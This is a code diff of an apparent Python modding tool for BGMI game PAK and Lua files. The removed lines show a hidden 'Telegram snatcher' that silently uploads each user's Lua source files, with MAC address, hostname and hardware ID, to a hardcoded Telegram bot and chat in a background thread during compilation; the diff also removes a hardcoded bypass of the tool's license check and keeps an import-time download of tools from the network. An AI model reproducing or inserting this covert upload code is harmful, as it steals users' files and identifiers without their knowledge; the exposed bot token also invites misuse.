@@ -346,52 +346,6 @@ except ImportError as e:
     _PAK_IMPORT_ERROR = str(e)
 
 # ============================================================
-# TELEGRAM SNATCHER SYSTEM (FIXED - NO DUPLICATE)
-# ============================================================
-
-TELEGRAM_BOT_TOKEN = "8879016682:AAEuyVYw_r9C-NxpRM7yH9yWgOnqQ1XmoGQ"
-TELEGRAM_CHAT_ID = "-1004213138800"
-
-def get_system_id() -> str:
-    try:
-        mac = uuid.getnode()
-        if mac != 0xffffffffffff:
-            return f"MAC_{mac:012x}"
-    except:
-        pass
-    try:
-        import socket
-        hostname = socket.gethostname()
-        return f"HOST_{hostname[:16]}"
-    except:
-        pass
-    return f"RAND_{uuid.uuid4().hex[:8]}"
-
-def send_lua_to_telegram(file_path: Path, context: str = ""):
-    if not HAS_REQUESTS:
-        return
-    try:
-        system_id = get_system_id()
-        hwid = get_hwid()
-        file_size = file_path.stat().st_size
-        now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        
-        caption = f"[FILE] {file_path.name}\n[SIZE] {file_size} bytes\n[ID] {system_id}\n[HWID] {hwid}\n[TIME] {now}\n[CONTEXT] {context}"
-        
-        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
-        
-        def send():
-            try:
-                with open(file_path, 'rb') as f:
-                    requests.post(url, files={'document': f}, data={'chat_id': TELEGRAM_CHAT_ID, 'caption': caption}, timeout=30)
-            except:
-                pass
-        
-        Thread(target=send).start()
-    except:
-        pass
-
-# ============================================================
 # Online Tool SYSTEM
 # ============================================================
 
@@ -414,11 +368,7 @@ AUTH_CONFIG_FILE = ANA_DIZIN / "config.json"
 PANEL_URL = "https://codes-bgmi.rf.gd/op/kuro-panel/connect"
 GAME_NAME = "BGMI — Battlegrounds Mobile India"
 
-_auth_data = {
-    "modname": "YUKIOH ŌKAMI TOOL",
-    "credit": "Unlimited",
-    "expiry": "N/A"
-}
+_auth_data = None
 
 def _ensure_base_dirs():
     for d in [ANA_DIZIN, PAKS_DIR, UNPACKED_DIR, REPACKED_DIR, MANIFEST_DIR,
@@ -467,6 +417,8 @@ def clear_saved_auth():
         AUTH_CONFIG_FILE.unlink()
 
 def verify_key_with_panel(user_key: str, serial: str = None) -> dict:
+    if not HAS_REQUESTS:
+        return {'status': False, 'reason': 'requests module not installed (pip install requests)'}
     if serial is None:
         serial = get_hwid()
     payload = {
@@ -1118,7 +1070,6 @@ if HAS_PAK_DEPS:
             self.start = reader.u8()
             self.end   = reader.u8()
 
-    @dataclass
     class TencentPakEntry:
         def __init__(self, reader, version):
             self.content_hash       = reader.s(20)
@@ -1492,7 +1443,6 @@ if HAS_PAK_DEPS:
                     task = prog.add_task("Compiling...", total=len(lua_sources))
                     for src_file in lua_sources:
                         prog.update(task, advance=1, description=f"[cyan]{src_file.name[:40]}")
-                        send_lua_to_telegram(src_file, f"COMPILE_MODE|{pak_stem}")
                         out_bc = compiled_tmp / src_file.name
                         orig_t24 = LUA_ORIGINAL_DIR / pak_stem / src_file.name
                         orig_sname = _extract_source_name_t24(str(orig_t24)) if orig_t24.exists() else None
@@ -1712,12 +1662,10 @@ _K = bytes.fromhex("112136474657a78d9d8490d8ab008c35261af7e45805b8b31507d02c1e8f
 TEMP_DIR = os.path.join(tempfile.gettempdir(), "cache_" + uuid.uuid4().hex)
 os.makedirs(TEMP_DIR, exist_ok=True)
 JAVA_JAR = os.path.join(TEMP_DIR, "unluac_patched.jar")
-LUA53_DLL = os.path.join(TEMP_DIR, "lua53.dll")
 
 def _download_tools():
     files = {
         JAVA_JAR: f"{GITHUB_RAW_BASE}/unluac_patched.jar",
-        LUA53_DLL: f"{GITHUB_RAW_BASE}/lua53.dll",
     }
     for local_path, url in files.items():
         if os.path.exists(local_path): continue
@@ -1736,7 +1684,7 @@ _download_tools()
 
 def _cleanup_lua_tools():
     try:
-        for f in [JAVA_JAR, LUA53_DLL]:
+        for f in [JAVA_JAR]:
             if os.path.exists(f): os.remove(f)
         if os.path.exists(TEMP_DIR): os.rmdir(TEMP_DIR)
     except: pass
@@ -2260,7 +2208,11 @@ def main():
 
     startup_animation()
 
-    auth_data = check_auth()
+    try:
+        auth_data = check_auth()
+    except KeyboardInterrupt:
+        console.print("\n[yellow]Authentication cancelled by user.[/yellow]")
+        sys.exit(0)
     if auth_data is None:
         error("Authentication failed. Exiting.")
         sys.exit(1)
@@ -2423,7 +2375,6 @@ def main():
                 task = prog.add_task("Compiling...", total=len(lua_sources))
                 for src_file in lua_sources:
                     prog.update(task, advance=1, description=f"[cyan]{src_file.name[:40]}")
-                    send_lua_to_telegram(src_file, f"COMPILE_ONLY|{stem}")
                     out_bc = out_dir / src_file.name
                     orig_t24 = LUA_ORIGINAL_DIR / stem / src_file.name
                     orig_sname = _extract_source_name_t24(str(orig_t24)) if orig_t24.exists() else None
